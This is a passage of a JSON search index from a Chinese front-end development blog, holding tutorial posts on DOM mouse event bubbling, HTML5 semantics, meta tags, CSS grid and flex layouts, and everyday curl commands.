事件是否为冒泡事件可由 event.bubbles 事件属性返回。 true - 事件可通过 DOM 冒泡 false - 事件不冒泡 事件处理：网景主张捕获方式（事件从根节点到子节点传播），微软主张冒泡方式（事件从子节点到根节点传播），w3c 采用了两种方式的统一标准。addEventListener 的第三个参数指定一个 Boolean，表示冒泡还是捕获，默认 false，表示在冒泡阶段执行，为 true 则表示在捕获阶段执行。第三个参数也可以指定一个键值选项，例如 once: true 表示只执行一次，这时的冒泡和捕获要用键值 capture 表示。 &lt;button onclick=&quot;console.log(event.bubbles)&quot;&gt;点击按钮查看 onclick 事件是否为冒泡事件&lt;/button&gt; addEventListener 的第三个参数可以指定一个 Boolean，表示冒泡还是捕获，默认 false，表示在冒泡阶段执行，为 true 则表示在捕获阶段执行。第三个参数也可以指定一个键值选项，例如 once: true 表示只执行一次，这时的冒泡和捕获也要用键值 capture 表示。 示例 总结 鼠标从移入元素到移出，事件执行顺序为： 鼠标移入时，先触发 mouseover，再触发 mouseenter，然后 mousemove； 鼠标移出时，先触发 mouseout，再触发 mouseleave。 冒泡： mouseenter mouseleave 不会冒泡； 而 mouseover mouseout 会冒泡，即从自身元素和子元素上之间移动时也会触发。 ","link":"https://zkrisj.github.io/post/mouseenter-mouseleave-mouseover-mouseout-mousemove-shu-biao-shi-jian-mou-pao-dui-bi/"},{"title":"HTML5 的规则和迁移","content":"介绍 HTML5 是专门为承载丰富的 web 内容而设计的，并且无需额外插件。 HTML5 拥有新的语义、图形以及多媒体元素。 HTML5 提供的新元素和新的 API 简化了 web 应用程序的搭建。 HTML5 是跨平台的，被设计为在不同类型的硬件（PC、平板、手机、电视机等等）之上运行。 迁移 典型的 HTML4 典型的 HTML5 &lt;div id=&quot;header&quot;&gt; &lt;header&gt; &lt;div id=&quot;menu&quot;&gt; &lt;nav&gt; &lt;div id=&quot;content&quot;&gt; &lt;section&gt; &lt;div id=&quot;post&quot;&gt; &lt;article&gt; &lt;div id=&quot;footer&quot;&gt; &lt;footer&gt; 非语义元素：&lt;div&gt; 和 &lt;span&gt; - 无法提供关于其内容的信息。 语义元素：&lt;form&gt;、&lt;table&gt; 以及 &lt;img&gt; - 清楚地向浏览器和开发者描述其意义。 &lt;section&gt; 元素表示有主题的内容组，一般来说会包含一个标题。一般通过是否包含一个标题 &lt;h1&gt;-&lt;h6&gt; 作为子节点来辨识每一个 &lt;section&gt;。 &lt;article&gt; 元素表示独立的或可复用的结构。例如论坛帖子、杂志或新闻文章、评论、交互式组件。 &lt;figure&gt; 元素表示独立的流内容（图像、图表、照片、代码等等）。与 &lt;figcaption&gt; 配合使用（在 &lt;figure&gt; 块里是第一个或最后一个）。 规则 &lt;!DOCTYPE html&gt; 确保浏览器按照最佳的相关规范进行渲染。 &lt;html lang=&quot;zh-CN&quot;&gt; 有利于可访问性和搜索引擎，有助于本地化内容。 可以省略 &lt;html&gt;，&lt;head&gt; 和 &lt;body&gt; 标签（省略 &lt;body&gt; 会在老式浏览器（IE9）中产生错误）。 &lt;meta charset=&quot;utf-8&quot;&gt; 定义文档的字符集，确保恰当的解释，以及正确的搜索引擎索引。 &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; 更好地在移动设备上运行。 设置有意义的标题，&lt;title&gt;HTML5 Syntax and Coding Style&lt;/title&gt;。 链接样式表和加载外部脚本时可省略 type 属性。 不要完整地写出布尔属性，可以只写属性名来设置它。例如 required。 属性值使用双引号，而不是单引号。例如 class=&quot;nice&quot;。 使用连字符分隔多个单词，不要使用驼峰式。例如 class=&quot;editorial-summary&quot;。 使用文字字符代替实体引用（仍然需要转义尖括号和引号等字符）。例如字符 © 对应实体 &amp;copy;。 不要为空元素包含 XHTML 样式的尾部斜杠，因为它们是不必要的并且会减慢速度。例如 &lt;hr /&gt;。 对所有元素名称和属性名称/值使用小写，因为它看起来更整洁。 为了提高可读性，使用两个空格的缩进代替 TAB。 在逗号或分号之后添加空格，是所有书写类型的通用规则。 示例 &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;title&gt;HTML&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;!--[if lt IE 9]&gt; &lt;script src=&quot;http://cdn.static.runoob.com/libs/html5shiv/3.7/html5shiv.min.js&quot;&gt;&lt;/script&gt; &lt;![endif]--&gt; &lt;style&gt; body { font-family:Verdana,sans-serif;font-size:0.8em; } header,footer,section,article { border:1px solid grey; margin:5px;margin-bottom:15px;padding:8px; background-color:white; } header,footer { color:white;background-color:#444;margin-bottom:5px; } section { background-color:#ddd; } nav ul { margin:0;padding:0; } nav ul li { display:inline; margin:5px; } &lt;/style&gt; &lt;body&gt; &lt;header&gt; &lt;h1&gt;Monday Times&lt;/h1&gt; &lt;/header&gt; &lt;nav&gt; &lt;ul&gt; &lt;li&gt;News&lt;/li&gt; &lt;li&gt;Sports&lt;/li&gt; &lt;li&gt;Weather&lt;/li&gt; &lt;/ul&gt; &lt;/nav&gt; &lt;section&gt; &lt;h2&gt;News Section&lt;/h2&gt; &lt;article&gt; &lt;h2&gt;News Article&lt;/h2&gt; &lt;p&gt;Ipsum lurum hurum turum ipsum lurum hurum turum ipsum lurum hurum turum ipsum lurum hurum turum.&lt;/p&gt; &lt;p&gt;Ipsum lurum hurum turum ipsum lurum hurum turum ipsum lurum hurum turum ipsum lurum hurum turum.&lt;/p&gt; &lt;p&gt;Ipsum lurum hurum turum ipsum lurum hurum turum ipsum lurum hurum turum ipsum lurum hurum turum.&lt;/p&gt; &lt;/article&gt; &lt;article&gt; &lt;h2&gt;News Article&lt;/h2&gt; &lt;p&gt;Ipsum lurum hurum turum ipsum lurum hurum turum ipsum lurum hurum turum ipsum lurum hurum turum.&lt;/p&gt; &lt;p&gt;Ipsum lurum hurum turum ipsum lurum hurum turum ipsum lurum hurum turum ipsum lurum hurum turum.&lt;/p&gt; &lt;p&gt;Ipsum lurum hurum turum ipsum lurum hurum turum ipsum lurum hurum turum ipsum lurum hurum turum.&lt;/p&gt; &lt;/article&gt; &lt;/section&gt; &lt;footer&gt; &lt;p&gt;© 2014 Monday Times. All rights reserved.&lt;/p&gt; &lt;/footer&gt; &lt;/body&gt; &lt;/html&gt; ","link":"https://zkrisj.github.io/post/html5-de-gui-ze-he-qian-yi/"},{"title":"如何使用 meta 标签","content":"介绍 &lt;meta&gt; 元素用来表示不能由其它 HTML 元相关（meta-related）元素（(&lt;base&gt;、&lt;link&gt;、&lt;script&gt;、&lt;style&gt; 或 &lt;title&gt;）之一表示的数据信息，元素标签内不包含任何内容。 具有不同属性的多个 &lt;meta&gt; 元素可以在同一页面上使用。&lt;meta&gt; 元素内容不会显示在页面上，但是对于机器是可读的，可用于模拟 HTTP 响应头字段的使用，页面描述、关键字用于搜索引擎优化，或其他 web 服务。 属性 &lt;meta&gt; 标签的属性定义了与文档相关联的名称/值对，元数据总是以名称/值的形式被成对传递的。 对于 HTML 4.01 和 XHTML 1.0，有四个有效的属性：content、http-equiv、name 和 scheme。在 HTML 5 下，现在有五个有效的属性，添加了 charset。http-equiv 用于模拟 HTTP 标题，并用 name 来嵌入元数据。无论哪种情况，语句的值都包含在 content 属性中，除非给出 charset，否则这是唯一必需的属性。 &lt;meta&gt; 标签通常位于 &lt;head&gt; 区域内，但在 HTML5 中不再需要 &lt;head&gt; 标签。 属性 值 描述 charset character_set 规定 HTML 文档的字符编码。 content text 定义与 http-equiv 或 name 属性相关的元信息。 http-equiv content-security-policycontent-typedefault-stylerefresh 把 content 属性关联到 HTTP 头部。 name application-nameauthordescriptiongeneratorkeywordsviewport 把 content 属性关联到一个名称。 scheme format/URI 定义用于翻译 content 属性值的格式。 name 属性 name 属性提供了名称/值对中的名称。HTML 和 XHTML 标签都没有指定任何预先定义的 &lt;meta&gt; 名称。通常情况下，您可以自由使用对自己和源文档的读者来说富有意义的名称。 keywords 是一个经常被用到的名称。它为文档定义了一组关键字。某些搜索引擎在遇到这些关键字时，会用这些关键字对文档进行分类。 类似这样的 meta 标签可能对于进入搜索引擎的索引有帮助： &lt;meta name=&quot;keywords&quot; content=&quot;HTML,ASP,PHP,SQL&quot;&gt; 如果没有提供 name 属性，那么名称/值对中的名称会采用 http-equiv 属性的值。 http-equiv 属性 http-equiv 属性为名称/值对提供了名称。并指示服务器在发送实际的文档之前先在要传送给浏览器的 MIME 文档头部包含名称/值对。 当服务器向浏览器发送文档时，会先发送许多名称/值对。虽然有些服务器会发送许多这种名称/值对，但是所有服务器都至少要发送一个：content-type:text/html。这将告诉浏览器准备接受一个 HTML 文档。 使用带有 http-equiv 属性的 &lt;meta&gt; 标签时，服务器将把名称/值对添加到发送给浏览器的内容头部。例如，添加： &lt;meta http-equiv=&quot;expires&quot; content=&quot;31 Dec 2008&quot;&gt; 这样发送到浏览器的头部就应该包含： content-type: text/html charset:iso-8859-1 expires:31 Dec 2008 当然，只有浏览器可以接受这些附加的头部字段，并能以适当的方式使用它们时，这些字段才有意义。 content 属性 content 属性提供了名称/值对中的值。该值可以是任何有效的字符串。 content 属性始终要和 name 属性或 http-equiv 属性一起使用。 scheme 属性 scheme 属性用于指定要用来翻译属性值的方案。此方案应该在由 &lt;head&gt; 标签的 profile 属性指定的概况文件中进行了定义。 HTML 4.01 与 HTML5之间的差异 在 HTML5 中，有一个新的 charset 属性，它使字符集的定义更加容易： HTML 4.01：&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; HTML5：&lt;meta charset=&quot;UTF-8&quot;&gt; 示例 定义创作者和修改信息： &lt;meta name=&quot;author&quot; content=&quot;Chris Mills&quot;&gt; &lt;meta name=&quot;revised&quot; content=&quot;David Yang,8/1/07&quot;&gt; 定义文档关键词和页面描述，用于搜索引擎： &lt;meta name=&quot;description&quot; content=&quot;HTML examples&quot;&gt; &lt;meta name=&quot;keywords&quot; content=&quot;HTML, CSS, XML, XHTML, JavaScript&quot;&gt; 下面示例演示 3 秒后，重定向到另外一个地址，如果 url 为空则会刷新当前网页： &lt;meta http-equiv=&quot;refresh&quot; content=&quot;3;url=https://www.baidu.com&quot;&gt; 在文档级别上设置浅色模式与深色模式的工作方式与 CSS color-scheme 属性允许单个元素指定其首选和接受的配色方案相同： &lt;meta name=&quot;color-scheme&quot; content=&quot;dark light&quot;&gt; 为当前页面定义内容策略，例如，已经存在的一个网站，用了太多内联代码修复问题，而且想确保资源（如图片、字体、脚本等）只从 https 加载，并且禁止插件： &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'&quot;&gt; 微前端需要按功能拆分多个子应用，主应用在加载的过程中经常出现加载失败的问题。因为 https 地址中，如果加载了 http 资源，浏览器将认为这是不安全的资源，将会默认阻止。后来在文档中添加了以下 &lt;meta&gt; 标签完美解决： &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;upgrade-insecure-requests&quot;&gt; 禁止浏览器从本地机的缓存中调阅页面内容，设定后，一旦离开网页就无法从 Cache 中再调出： &lt;meta http-equiv=&quot;Pragma&quot; content=&quot;no-cache&quot;&gt; 定义搜索引擎机器人(不包括恶意爬虫)对此页面的处理行为： &lt;meta name=&quot;robots&quot; content=&quot;index,follow&quot;&gt; index：允许机器人索引此页面（默认）。 follow：允许机器人跟随此页面上的链接（默认）。 noindex：要求机器人不索引此页面。 nofollow：要求机器人不跟随此页面上的链接。 all：与 index, follow 相同。 none：与 noindex, nofollow 相同。 noarchive：要求搜索引擎不缓存页面内容。 nocache：noarchive 的替代名称。 nosnippet：防止在搜索引擎结果中显示页面的任何描述。 noimageindex：要求此页面不显示为图片索引的引用页面。 典型的移动优化网站会设置 &lt;meta&gt; 标签视口宽度等于屏幕宽度，这样可以避免当视口宽度大于屏幕宽度时，出现横向滚动条： &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;meta&gt; 标签的 viewport 的属性包括： width：视口的宽度，可以设置为特殊值 device-width，数字（1-10000），或 100vw, 100% 这样的有效值。负值：忽略。 height：视口的高度，可以设置为特殊值 device-height，数字（1-10000），或 100vh, 100% 这样的有效值。负值：忽略。 initial-scale：控制第一次加载页面时的缩放级别。最小值：0.1。最大值：10。默认值：1。负值：忽略。 minimum-scale：控制页面上允许的缩小程度。最小值：0.1。最大值：10。默认值：0.1。负值：忽略。 maximum-scale：控制页面上允许的放大程度。最小值：0.1。最大值：10。默认值：10。负值：忽略。 user-scalable：控制页面上是否允许放大和缩小操作。有效值：0、1、yes 或 no。默认值：1，与 yes 相同。将该值设置为 0（与否相同），将违反 Web 内容可访问性指南 (WCAG)。 引用资料 meta标签到底是做什么的 HTML &lt;meta&gt; 标签 ","link":"https://zkrisj.github.io/post/ru-he-shi-yong-meta-biao-qian/"},{"title":"使用 grid 轻松实现各种布局","content":"介绍 CSS 网格布局用于将一个页面划分为几个主要区域，以及定义这些区域的大小、位置、层次等关系。 与 table 表格一样，网格布局让我们能够按行或列来对齐元素，但在布局上，网格比表格更容易做到且更简单。 与弹性盒 网格布局和 flex 弹性盒布局的主要区别在于弹性盒布局是一维布局（沿横向或纵向的），而网格布局是二维布局（同时沿着横向和纵向）。 弹性盒的不足 比如以下一个宽度 500px 的容器内有五个元素区域，我们使用弹性盒来对齐这些区域。在每个子项目上设置 flex: 1 1 150px;，在 150px 基准上伸缩。flex-wrap 属性为 wrap，从而当容器变得太窄时，元素会换到新的一行。 &lt;div class=&quot;wrapper&quot;&gt; &lt;div&gt;One&lt;/div&gt; &lt;div&gt;Two&lt;/div&gt; &lt;div&gt;Three&lt;/div&gt; &lt;div&gt;Four&lt;/div&gt; &lt;div&gt;Five&lt;/div&gt; &lt;/div&gt; .wrapper { width: 500px; display: flex; flex-wrap: wrap; } .wrapper &gt; div { flex: 1 1 150px; } 你可以看到有两个元素被换到了新行。这两个元素共享了这行的可用空间，并没有与上一行的元素对齐。这表示当你允许弹性元素换行时，每个新行都变成了一个新的弹性容器。那有没有可以在新行也与上一行保持对齐的方法？答案是网格。 我们用网格更简单地创建同样的布局。只需要给这些子元素设置设置 3 个 1fr 的列，并不需要任何其他属性，它们会自动按顺序填充到网格的单元格中。你可以看到它们按网格规整的排列，行与行、列与列对齐。当有 5 个子元素时，第二行的尾部会留出一个空隙。 .wrapper { display: grid; grid-template-columns: repeat(3, 1fr); } fr 关键字为 fraction 的缩写，表示了网格容器中的一段可变长度。repeat() 函数用于在 CSS 中快速编写网格，repeat(3, 1fr) 相当于 1fr 1fr 1fr。 如何选择该用网格还是弹性盒？ 我只需要按行或者列控制布局？那就用弹性盒子。 我需要同时按行和列控制布局？那就用网格。 弹性盒关注的是内容，而网格侧重布局。当你使用弹性盒，并发现自己禁用了一些弹性特性，那你可能需要的是 CSS 网格布局。例如，你给一个弹性元素设置百分比宽度来使它和上一行的元素对齐。这种情况下，网格很可能是一个更好的选择。 详细可以 MDN 了解以下，接下来我们来使用 grid 实现各种布局。 超级居中布局 .parent { display: grid; place-items: center; } 其中 place-items 属性是一个简写形式。 place-items: &lt;align-items&gt; &lt;justify-items&gt;; align-items 属性控制垂直位置，justify-items 属性控制水平位置。如果未提供第二个值，则第一个值作为第二个值的默认值。所以，place-items: center; 等同于 place-items: center center;。 侧边栏布局 一个边栏，一个主栏。 .container { display: grid; grid-template-columns: minmax(150px, 25%) 1fr; } 这里使用 minmax(最小值, 最大值) 函数定义了一个长宽范围的闭区间，表示列宽不会收缩小于 150px 且不会拉伸大于容器宽度的 25%。每个参数分别是 &lt;length&gt;、&lt;percentage&gt;、&lt;flex&gt; 的一种，或者是 max-content、min-content、或 auto 之一。如果 最大值 &lt; 最小值，则 最大值 被忽略并返回 最小值。&lt;flex&gt; 值作为 最大值 时设置网格轨道的弹性系数；作为 最小值 时无效。auto 作为最大值时，等价于 max-content；作为 最小值 时，它表示轨道中单元格最小长宽（min-width/min-height）的最大值。 三明治布局 页面在垂直方向上，分成三部分：页眉、内容区、页脚。这个布局会根据设备宽度，自动适应，并且不管内容区有多少内容，页脚始终在容器底部（粘性页脚）。 .container { display: grid; grid-template-rows: auto 1fr auto; } 其中第一部分（页眉）和第三部分（页脚）的高度都为 auto，表示本来的内容高度；第二部分（内容区）的高度为 1fr，表示剩余的所有高度，这可以保证页脚始终在容器的底部。 经典圣杯布局 最常用的布局，所以被比喻为圣杯。它将页面分成五个部分，除了页眉和页脚，内容区分成左边栏、主栏、右边栏。 .container { display: grid; grid-template: auto 1fr auto / auto 1fr auto; } grid-template 是 grid-template-rows、grid-template-columns 与 grid-template-areas 的简写形式。有三种写法： 关键字，默认 grid-template: none;。其他还有 inherit、initial、revert、revert-layer、unset。 grid-template-rows / grid-template-columns，例如本例子中的 grid-template: auto 1fr auto / auto 1fr auto;。 grid-template-areas grid-template-rows / grid-template-column，例如： grid-template: &quot;a a a&quot; 40px &quot;b c c&quot; 40px &quot;b c c&quot; 40px / 1fr 1fr 1fr; 圣杯布局2 将页面分成四个部分，除了页眉和页脚，内容区分成左边栏、主栏。 #container { display: grid; grid-template: &quot;head head&quot; 30px &quot;nav main&quot; 1fr &quot;nav foot&quot; 30px / 120px 1fr; } header { background-color: lime; grid-area: head; } nav { background-color: lightblue; grid-area: nav; } main { background-color: yellow; grid-area: main; } footer { background-color: red; grid-area: foot; } 这里自定义了四个 grid-area 标识，并在 grid-template 中引用它们。然后页眉被分配了 30px 固定高度和 100% 的宽度；左边栏被分配了 1fr + 30px 弹性高度和 120px 固定宽度；主栏被分配了 1fr 的弹性高度和 1fr 的弹性宽度；页脚被分配了 30px 的固定高度和 1fr 的弹性宽度。 瀑布流布局 表现为参差不齐的多栏布局，以图片为主，大小不一的图片按照一定的规律排列。随着页面滚动条向下滚动，还会不断加载数据块并附加至当前尾部。 .container { display: grid; grid-template-columns: repeat(3, 1fr); grid-gap: 20px; grid-auto-rows: minmax(100px, auto); } .one { grid-column: 1 / 2; grid-row: 1; background: #19CAAD; } .two { grid-column: 2 / 4; grid-row: 1 / 3; background: #8CC7B5; } .three { grid-row: 2 / 5; grid-column: 1; background: #D1BA74; } .four { grid-column: 3; grid-row: 3; background: #BEE7E9; } .five { grid-column: 2; grid-row: 3/5; background: #E6CEAC; } .six { grid-column: 3; grid-row: 4; background: #ECAD9E; } grid-auto-columns 属性和 grid-auto-rows 属性表示浏览器将根据指定值自动设置网格的列宽和行高。它们的写法与 grid-template-columns 和 grid-template-rows 完全相同。如果没有指定这四个属性，浏览器会根据单元格内容的大小，决定网格的列宽和行高。 跨网格布局 另一个经典布局：12 网格布局。 .parent { display: grid; grid-template-columns: repeat(12, 1fr); } .child-span-12 { grid-column: 1 / 13; } repeat(12, 1fr); 表示 12 弹性宽度列。grid-column: 1 / 13 将跨越从第一列到最后一列（第 13 列），总共占 12 列。也可以使用 span 关键字，设置起始线，然后设置从该起点跨越的列数。grid-column: 1 / span 12 等效于 grid-column: 1 / 13 ，而 grid-column: 2 / span 6 等效于 grid-column: 2 / 8 。 ","link":"https://zkrisj.github.io/post/shi-yong-grid-qing-song-shi-xian-ge-chong-bu-ju/"},{"title":"flex 属性的几种写法","content":"2009年，W3C 提出了一种新的方案----Flex 布局，定义了一种针对用户界面设计而优化的 CSS 盒子模型。目前，它已经得到了所有浏览器的支持。如果学会使用它写 CSS 布局，简直太方便了。 容器的属性 Flex 容器存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis），主轴由 flex-direction 定义。以下6个属性设置在容器上。 flex-direction: row | row-reverse | column | column-reverse; flex-wrap: nowrap | wrap | wrap-reverse; flex-flow: &lt;'flex-direction'&gt; || &lt;'flex-wrap'&gt;; justify-content: flex-start | flex-end | center | space-between | space-around; align-items: flex-start | flex-end | center | baseline | stretch; align-content: flex-start | flex-end | center | space-between | space-around | stretch; 项目的属性 以下6个属性设置在项目上。 order: &lt;integer&gt;; flex-grow: &lt;number&gt;; /* 负值无效。省略时默认值为 1。 (初始值为 0) */ flex-shrink: &lt;number&gt;; /* 负值无效。省略时默认值为1。 (初始值为 1) */ flex-basis: &lt;length&gt; | auto; /* 若值为0，则必须加上单位，以免被视作伸缩性。省略时默认值为 0。(初始值为 auto) */ flex: none | auto | initial | [ &lt;'flex-grow'&gt; &lt;'flex-shrink'&gt;? || &lt;'flex-basis'&gt; ] align-self: auto | flex-start | flex-end | center | baseline | stretch; flex属性 flex 属性是 flex-grow, flex-shrink 和 flex-basis 的简写，默认值为 0 1 auto。 关键字语法： initial 元素会根据自身宽高设置尺寸。它会缩短自身以适应 flex 容器，但不会伸长并吸收 flex 容器中的额外自由空间来适应 flex 容器 。相当于将属性设置为 flex: 0 1 auto。 auto 元素会根据自身的宽度与高度来确定尺寸，但是会伸长并吸收 flex 容器中额外的自由空间，也会缩短自身来适应 flex 容器。这相当于将属性设置为 flex: 1 1 auto. none 元素会根据自身宽高来设置尺寸。它是完全非弹性的：既不会缩短，也不会伸长来适应 flex 容器。相当于将属性设置为 flex: 0 0 auto。 单值语法： 无单位数: 它会被当作flex:&lt;number&gt; 1 0;，其中 &lt;flex-grow&gt; 的值为 number，&lt;flex-shrink&gt; 的值被假定为 1，然后 &lt;flex-basis&gt; 的值被假定为0。 一个有效的宽度 (width)值：它会被当作 &lt;flex-basis&gt; 的值。 双值语法: 第一个值必须为一个无单位数，并且它会被当作 &lt;flex-grow&gt; 的值。第二个值必须为一个无单位数：它会被当作 &lt;flex-shrink&gt; 的值。 第一个值必须为一个无单位数，并且它会被当作 &lt;flex-grow&gt; 的值。第二个值必须为一个有效的宽度值：它会被当作 &lt;flex-basis&gt; 的值。 三值语法： 第一个值必须为一个无单位数，并且它会被当作 &lt;flex-grow&gt; 的值。 第二个值必须为一个无单位数，并且它会被当作 &lt;flex-shrink&gt; 的值。 第三个值必须为一个有效的宽度值，并且它会被当作 &lt;flex-basis&gt; 的值。 示例 一般将 flex 设置为以下值之一：auto，initial，none，或一个无单位正数。调整以下 flex 容器的大小查看这些值的效果： ","link":"https://zkrisj.github.io/post/flex-shu-xing-de-ji-chong-xie-fa/"},{"title":"curl 常用命令","content":"介绍 URL 命令行工具，cmd 和 powershell 中都可用。支持多种通信协议，包括 DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SBMS, SMTP, SMTPS, TELNET 和 TFTP。 查看网页源码 curl https://www.baidu.com 保存到文件 curl https://www.baidu.com -o 1.html 获取头信息 curl https://www.baidu.com -i curl https://www.baidu.com -I 显示通信过程 curl https://www.baidu.com -v 保存到文件 curl https://www.baidu.com --trace 1.txt curl https://www.baidu.com --trace-ascii 1.txt HTTP动词(必须大写) curl http://localhost:8080/secret -X POST 传参数 -G 参数用来构造 URL 的查询字符串，如果省略 -G，会发出一个 POST 请求。-d 参数会自动加上标头 Content-Type:application/x-www-form-urlencoded，并且自动将请求转为 POST 方法，因此可以省略 -X POST。 curl &quot;http://localhost:8080/process_get?first_name=a&amp;last_name=b&quot; curl http://localhost:8080/process_get -G -d first_name=a -d last_name=b curl http://localhost:8080/process_post -d &quot;first_name=a&amp;last_name=b&quot; 从文件读取参数 curl http://localhost:8080/process_post -d @1.json 多个参数 curl http://localhost:8080/process_post -d first_name=a -d last_name=b curl http://localhost:8080/process_post -F first_name=a -F last_name=b 增加头信息 curl http://localhost:8080/process_post -d {\\&quot;first_name\\&quot;:\\&quot;a\\&quot;,\\&quot;last_name\\&quot;:\\&quot;b\\&quot;} -H Content-Type:application/json 文件下载 单个文件 curl -o 1.png https://lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/img/default.640d9a7.png 单个文件并使用源文件名 curl -O https://lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/img/default.640d9a7.png 多个文件 curl -o 1.png https://lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/img/default.640d9a7.png -o 2.png https://www.denojs.cn/img/logo.png 多个文件并使用源文件名 curl --remote-name-all https://lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/img/default.640d9a7.png https://www.denojs.cn/img/logo.png 文件上传 -F 参数会自动加上标头Content-Type:multipart/form-data，默认把 MIME 类型设为application/octet-stream。@ 之后的路径为当前路径的相对路径。 curl http://localhost:8080/file_upload -F image=@Pictures/debug.png;type=image/png;filename=me.png 多个文件 curl http://localhost:8080/file_upload -F image=@Pictures/debug.png -F image=@Pictures/微信图片_20220621144632.jpg 重定向 有些网络资源访问的时候必须经过另外一个地址跳转过去，这用术语来说是：referer。 curl http://localhost:8080 -e http://www.example.com 相当于 curl http://localhost:8080 -H 'Referer:http://www.example.com' 模拟 User Agent 可以针对不同设备，返回不同格式的网页。 curl http://localhost:8080 -A &quot;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36 HBuilderX&quot; 发送cookie curl http://localhost:8080 -b 1.txt curl http://localhost:8080 -b id=xxx;name=xxx 服务器认证 curl https://google.com/login -u name:password curl https://bob:12345@google.com/login 只设置了用户名，执行后，会提示用户输入密码： curl https://google.com/login -u bob http 认证 curl http://www.example.com -E mycert.pem 请求 HTTPS 并指定 HOST https 无法通过更改 Host 头部来指定 HOST，因为 TLS 握手时拿不到 Host，一般用于测试 CDN 加速。 请求 http://localhost:8080 并指定 Host 为 www.baidu.com curl http://localhost:8080 -H 'Host:www.baidu.com' 请求 https://www.baidu.com 并指定 Host 为 localhost:8080 curl https://www.baidu.com --resolve www.baidu.com:443:localhost:8080 跳过 SSL 检测 curl https://www.baidu.com -k 跟随重定向 curl https://api.twitter.com/tweet -L -d 'tweet=hi' 模拟慢网速(单位为每秒) curl https://www.sina.com.cn --limit-rate 20k 缩写 -#, --progress-bar -A, --user-agent -b, --cookie -d, --data -E, --cert -e, --referer -F, --form -G, --get -H, --header -h, --help -I, --head -i, --include -k, --insecure -L, --location -O, --remote-name -o, --output -u, --user -V, --version -v, --verbose -X, --request -x, --proxy ","link":"https://zkrisj.github.io/post/curl-chang-yong-ming-ling/"}]}